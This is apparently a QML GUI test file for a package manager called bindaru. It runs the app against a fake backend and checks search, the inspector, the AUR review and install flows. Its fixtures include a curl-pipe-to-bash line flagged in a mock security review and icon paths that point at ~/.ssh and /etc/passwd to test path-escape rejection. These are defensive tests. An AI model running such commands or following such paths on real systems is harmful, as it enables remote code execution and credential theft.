// Drives bindaru's window (AppView over a Store) with a fake backend and checks the layout and
// the flows. tests/gui/run.sh assembles the QML module and runs it; with a shots directory it
// also saves a screenshot per state.
import QtQuick
import QtQuick.Controls as QQC2
import QtTest

Item {
    id: root
    width: 1180
    height: 740

    property string shotsDir: ""
    // uQ theme tokens (as the app reads them) to render the shots in; null follows the desktop.
    property var uqTokens: null
    readonly property string hash: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

    function pkg(name, version, repo, desc, installed, size, extra) {
        return Object.assign({ name: name, version: version, repo: repo, source: repo === "aur" ? "aur" : "repo", description: desc, installed: installed, url: null, licenses: [], depends: [], download_size: null, installed_size: size }, extra || {});
    }
    readonly property var installedList: [
        pkg("firefox", "142.0-1", "extra", "Fast, private and safe web browser", true, "262.00 MiB"),
        pkg("htop", "3.4.1-1", "extra", "Interactive process viewer", true, "470.00 KiB"),
        pkg("neovim", "0.11.4-1", "extra", "Fork of Vim aiming to improve user experience", true, "31.20 MiB"),
        pkg("git", "2.51.0-1", "extra", "The fast distributed version control system", true, "45.10 MiB"),
        pkg("paru-bin", "2.0.4-1", "aur", "Feature packed AUR helper", true, "9.50 MiB"),
        pkg("steam", "1.0.0.85-1", "multilib", "Valve's digital software delivery system", true, "4.40 MiB"),
        pkg("kitty", "0.43.1-1", "extra", "A modern, hackable, featureful, OpenGL-based terminal emulator", true, "21.00 MiB"),
        pkg("oysterav-security", "0.9.2-1", "aur", "Linux security orchestrator with a ClamAV spine", true, "3.20 MiB"),
        pkg("mpv", "1:0.40.0-1", "extra", "A free, open source, and cross-platform media player", true, "5.80 MiB"),
        pkg("zsh", "5.9-5", "extra", "A very advanced and programmable command interpreter", true, "6.30 MiB")
    ]
    readonly property var found: [
        pkg("btop", "1.4.0-1", "extra", "A monitor of resources", false, null),
        pkg("htop", "3.4.1-1", "extra", "Interactive process viewer", true, null),
        pkg("btop-git", "r123.abc-1", "aur", "btop from git", false, null, { votes: 12, popularity: 0.4 })
    ]
    readonly property var repos: [
        { name: "core", enabled: true, origin: "official", servers: [], includes: ["/etc/pacman.d/mirrorlist"], sig_level: null },
        { name: "extra", enabled: true, origin: "official", servers: [], includes: ["/etc/pacman.d/mirrorlist"], sig_level: null },
        { name: "multilib", enabled: true, origin: "official", servers: [], includes: ["/etc/pacman.d/mirrorlist"], sig_level: null },
        { name: "multilib-testing", enabled: false, origin: "official", servers: [], includes: [], sig_level: null },
        { name: "my-repo", enabled: true, origin: "added", servers: ["https://repo.example.org/$arch"], includes: [], sig_level: "Required DatabaseRequired" }
    ]
    readonly property var config: ({ aur_enabled: true, aur_update_diff: true, aur_show_risky: true, view: "list", sort: "name", sort_descending: false, group_by: "none", density: "comfortable", show_inspector: true, search_in: "name-description", start_filter: "all", confirm_removals: true, show_dependencies: false, scan_installs: "aur" })
    readonly property var review: ({ hash: root.hash, review: { findings: [
                    { severity: "danger", line: 14, text: "Downloads and runs a script directly.", snippet: "curl -s https://example.org/i.sh | bash" },
                    { severity: "warn", line: 6, text: "A source is not checksummed (SKIP).", snippet: "sha256sums=('SKIP')" }] } })

    FakeBackend {
        id: fake
        replies: ({
                "config show --json": { code: 0, out: JSON.stringify(root.config), err: "" },
                "config set --json": { code: 0, out: "{}", err: "" },
                "icons --json": { code: 0, out: JSON.stringify({ firefox: "/usr/share/icons/breeze/apps/48/internet-web-browser.svg", htop: "/usr/share/icons/breeze/apps/48/utilities-system-monitor.svg", kitty: "/usr/share/icons/breeze/apps/48/utilities-terminal.svg", neovim: "/usr/share/icons/breeze/apps/48/accessories-text-editor.svg", mpv: "/home/me/.ssh/id.png", zsh: "/usr/share/../../etc/passwd.png" }), err: "" },
                "installed --json": { code: 0, out: JSON.stringify(root.installedList), err: "" },
                "repos list --json": { code: 0, out: JSON.stringify(root.repos), err: "" },
                "search --json": { code: 0, out: JSON.stringify(root.found), err: "" },
                "info --json btop-git": { code: 0, out: JSON.stringify({ package: root.found[2], aur: { maintainer: null, votes: 12, popularity: 0.4, flags: [{ id: "orphan", severity: "warn", text: "Nobody maintains this package (orphaned)." }, { id: "new", severity: "warn", text: "Submitted less than 30 days ago." }] } }), err: "" },
                "info --json": { code: 0, out: JSON.stringify({ package: Object.assign({}, root.installedList[0], { url: "https://www.mozilla.org", licenses: ["MPL-2.0"], depends: ["gtk3", "libxt", "dbus-glib", "nss>=3.100", "mozilla-common", "ffmpeg", "libpulse", "alsa-lib", "libx11", "libxcb", "libxrandr", "sh"], opt_depends: ["hunspell-en_us: Spell checking, American English", "libnotify: Notification integration", "pulseaudio: Audio support", "xdg-desktop-portal: Screensharing with Wayland"], required_by: ["browserpass-firefox", "firefox-i18n-en-us"], optional_for: ["xdg-utils"], provides: ["www-browser"], download_size: "70.10 MiB" }), aur: null }), err: "" },
                "review --json --aur": { code: 0, out: JSON.stringify(root.review), err: "" },
                "install --dry-run --json": { code: 0, out: JSON.stringify({ summary: "1 change", changes: [{ group: "Installed from the repositories", label: "btop", detail: "and the packages it needs", reversible: true }] }), err: "" },
                "install --aur --ndjson": { code: 0, out: "", err: "" },
                "repos add": { code: 0, out: "", err: "" }
            })
        events: ({
                "install --aur": [
                    { event: "step", id: "fetch-btop-git", state: "start" },
                    { event: "step", id: "fetch-btop-git", state: "done" },
                    { event: "step", id: "build-btop-git", state: "start" },
                    { event: "step", id: "build-btop-git", state: "output", detail: "==> Making package: btop-git r123.abc-1" }
                ]
            })
    }

    Store {
        id: store
        backend: fake
    }
    AppView {
        anchors.fill: parent
        store: store
    }

    function find(item, pred) {
        if (pred(item))
            return item;
        for (let i = 0; i < item.children.length; i++) {
            const f = find(item.children[i], pred);
            if (f)
                return f;
        }
        if (item.contentItem && item.contentItem !== item)
            return find(item.contentItem, pred);
        return null;
    }

    TestCase {
        name: "Window"
        when: windowShown

        function shot(name) {
            wait(60);
            if (root.shotsDir !== "")
                grabImage(root).save(root.shotsDir + "/" + name + ".png");
        }
        function named(n) {
            return root.find(root, i => i.objectName === n);
        }
        function init() {
            if (root.uqTokens !== null)
                Theme.tokens = root.uqTokens;
            store.page = "software";
            store.filter = "installed";
            store.query = "";
            store.found = null;
            store.select("");
            store.config = Object.assign({}, root.config);
            fake.calls = [];
            store.load();
            wait(120);
        }

        function test_layout_has_sidebar_header_main_and_inspector() {
            verify(named("search") !== null, "search in the header");
            verify(named("nav-all") !== null && named("nav-repos") !== null && named("nav-settings") !== null, "sidebar");
            verify(named("list") !== null && named("list").visible, "main list");
            compare(named("list").count, 10);
            store.select("firefox");
            wait(150);
            verify(store.details !== null, "the inspector has details");
            compare(store.details.pkg.licenses[0], "MPL-2.0");
            shot("software-list");
        }

        function test_grid_compact_and_grouped_views() {
            store.config = Object.assign({}, root.config, { view: "grid" });
            wait(50);
            verify(named("grid").visible && !named("list").visible);
            shot("view-grid");
            store.config = Object.assign({}, root.config, { view: "compact", group_by: "source" });
            wait(50);
            verify(named("list").visible);
            shot("view-compact-grouped");
        }

        function test_sorting_changes_the_order() {
            store.config = Object.assign({}, root.config, { sort: "size", sort_descending: true });
            wait(50);
            compare(store.shown[0].name, "firefox");
            store.config = Object.assign({}, root.config, { sort: "name", sort_descending: true });
            compare(store.shown[0].name, "zsh");
        }

        function test_the_sidebar_separates_your_software_from_the_catalogue() {
            verify(named("nav-all").current, "starts on what is installed");
            compare(store.browsing, false);
            // Browsing lists search results only: nothing until you search.
            named("nav-aur-filter").clicked();
            wait(50);
            compare(store.browsing, true);
            compare(store.shown.length, 0);
            verify(named("empty").visible, "an invitation to search, not the installed list");
            verify(named("search-repos") === null || !named("search-repos").visible);
            shot("browse-aur-empty");
            store.search("btop");
            wait(150);
            compare(store.shown.length, 1);
            compare(store.shown[0].name, "btop-git");
            shot("browse-aur-results");
            named("nav-repos-filter").clicked();
            wait(50);
            compare(store.shown.length, 2);
            named("nav-find-all").clicked();
            wait(50);
            compare(store.shown.length, 3);
            // Back on Installed the same text only filters your own software.
            named("nav-all").clicked();
            wait(50);
            compare(store.browsing, false);
            compare(store.shown.length, 0);
            store.search("htop");
            compare(store.shown.length, 1);
            compare(store.shown[0].name, "htop");
        }

        function test_installed_search_offers_the_repositories_when_nothing_matches() {
            store.search("nosuchthing");
            wait(100);
            compare(store.shown.length, 0);
            verify(named("empty").visible);
            shot("installed-no-match");
            const calls = fake.calls.filter(c => c[1][0] === "search").length;
            compare(calls, 0, "filtering installed software never asks the repositories");
            store.go("software", "all");
            wait(150);
            compare(fake.calls.filter(c => c[1][0] === "search").length, 1, "browsing runs the typed search");
        }

        function test_thumbnails_use_the_icon_found_and_fall_back_to_a_letter() {
            wait(100);
            compare(store.iconFor("firefox"), "file:///usr/share/icons/breeze/apps/48/internet-web-browser.svg");
            compare(store.iconFor("steam"), "", "no icon found: the letter tile stays");
            compare(store.iconFor("mpv"), "", "a file outside the icon folders is ignored");
            compare(store.iconFor("zsh"), "", "a path that climbs out of them is ignored");
            shot("software-list-icons");
        }

        function test_inspector_groups_dependencies() {
            store.select("firefox");
            wait(200);
            const deps = named("dependencies");
            verify(deps !== null && deps.visible, "dependencies section");
            compare(deps.groups.map(g => g.key), ["needs", "optional", "needed-by", "optional-for"]);
            compare(deps.groups[0].entries.length, 12);
            compare(deps.groups[0].entries.filter(e => e.name === "nss")[0].constraint, ">=3.100");
            compare(deps.groups[1].entries[0].reason !== "", true, "optional ones say why");
            compare(deps.current.key, "needs");
            verify(named("dep-more").visible, "long lists are cut with a way to see all");
            shot("inspector-needs");
            named("dep-tab-optional").clicked();
            wait(50);
            compare(deps.current.key, "optional");
            shot("inspector-optional");
            named("dep-tab-needed-by").clicked();
            wait(50);
            compare(deps.current.entries.length, 2);
            shot("inspector-needed-by");
        }

        function test_a_dependency_opens_in_the_inspector() {
            store.select("firefox");
            wait(200);
            fake.replies["info --json ffmpeg"] = { code: 0, out: JSON.stringify({ package: pkg("ffmpeg", "2:7.1-1", "extra", "Complete solution to record, convert and stream audio and video", false, "40.00 MiB"), aur: null }), err: "" };
            verify(named("dep-row-ffmpeg") !== null);
            store.openDependency("ffmpeg");
            wait(200);
            compare(store.selected, "ffmpeg");
            compare(store.details.pkg.name, "ffmpeg");
            // Something provided by another package says so and keeps the current selection.
            fake.replies["info --json sh"] = { code: 1, out: "", err: "not found" };
            store.openDependency("sh");
            wait(150);
            compare(store.selected, "ffmpeg");
            verify(store.note.indexOf("provided by another package") >= 0);
        }

        function test_search_shows_results_and_aur_inspector_with_review() {
            store.go("software", "all");
            store.search("btop");
            wait(150);
            compare(store.shown.length, 3);
            store.select("btop-git");
            wait(150);
            compare(store.details.aur.flags.length, 2);
            named("act-install").clicked();
            wait(150);
            verify(store.review !== null && store.review.hash === root.hash);
            compare(fake.calls.filter(c => c[1].indexOf("--ack") >= 0).length, 0, "nothing installs before the review is accepted");
            shot("aur-review-inspector");
            named("accept-review").clicked();
            wait(250);
            const run = fake.calls.filter(c => c[0] === "stream");
            compare(run.length, 1);
            compare(run[0][1].slice(0, 5), ["install", "--aur", "--ndjson", "--ack", root.hash]);
        }

        function test_repo_install_asks_with_the_plan_first() {
            store.go("software", "all");
            store.search("btop");
            wait(150);
            store.select("btop");
            wait(100);
            named("act-install").clicked();
            wait(150);
            verify(store.plan !== null);
            compare(fake.calls.filter(c => c[0] === "stream").length, 0);
            shot("install-confirm");
            named("confirm-plan").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[0] === "stream").length, 1);
        }

        function test_pages() {
            store.page = "repos";
            wait(60);
            verify(named("repo-switch-multilib") !== null && named("repo-remove-my-repo") !== null);
            shot("repositories");
            store.page = "scan";
            wait(60);
            shot("scan");
            store.page = "settings";
            wait(60);
            shot("settings");
        }

        function test_the_sidebar_hands_system_upgrades_to_bindleup() {
            const open = named("open-bindleup");
            verify(open !== null && open.visible, "a link to bindleUP");
            open.clicked();
            compare(fake.bindleupOpened, 1);
        }

        function test_changing_a_setting_calls_config_set() {
            store.setConfig("sort", "size");
            wait(100);
            compare(fake.calls.filter(c => c[1][0] === "config" && c[1][1] === "set" && c[1][4] === "size").length, 1);
            compare(store.config.sort, "size");
        }
    }
}
